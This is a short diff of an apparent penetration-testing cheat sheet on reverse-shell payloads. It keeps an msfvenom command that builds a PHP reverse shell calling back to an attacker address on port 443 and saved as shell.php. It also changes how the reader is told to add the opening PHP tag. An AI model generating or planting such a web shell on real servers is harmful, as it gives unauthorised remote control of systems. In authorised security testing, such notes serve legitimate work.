@@ -33,8 +33,7 @@ Staged payload
 ```
 > msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
 
-Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
-> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste > shell.php
+Make sure the file starts with <?php at the first line of the file so that it will execute as a PHP webpage.
 ```
 
 ###### .elf reverse shell
